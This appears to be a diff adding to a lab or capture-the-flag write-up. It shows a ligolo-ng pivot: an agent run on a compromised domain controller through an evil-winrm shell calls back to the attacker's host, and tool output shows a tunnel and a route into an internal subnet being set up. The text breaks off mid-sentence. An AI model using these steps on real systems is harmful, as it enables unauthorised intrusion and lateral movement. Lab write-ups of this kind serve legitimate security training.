@@ -407,5 +407,29 @@ ligolo-ng »
 Then ill start the proxy on my system
 
 ```python
-
+evil-winrm-py PS C:\ProgramData> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
 ```
+
+Ill then send the connection back to my machine
+
+```python
+ligolo-ng » INFO[0207] Agent joined.                                 id=00155d168601 name="PING\\C.Roberts@dc1" remote="10.129.245.56:55877"
+ligolo-ng » 
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - PING\C.Roberts@dc1 - 10.129.245.56:55877 - 00155d168601
+[Agent : PING\C.Roberts@dc1] » 
+
+[Agent : PING\C.Roberts@dc1] » ifcreate --name ligolo
+INFO[0221] Creating a new ligolo interface...           
+INFO[0221] Interface created!
+
+[Agent : PING\C.Roberts@dc1] » route_add --name ligolo --route 192.168.2.0/24
+INFO[0259] Route created.                               
+[Agent : PING\C.Roberts@dc1] » start
+INFO[0263] Starting tunnel to PING\C.Roberts@dc1 (00155d168601) 
+[Agent : PING\C.Roberts@dc1] » 
+```
+
+So first ill select the session then s
+
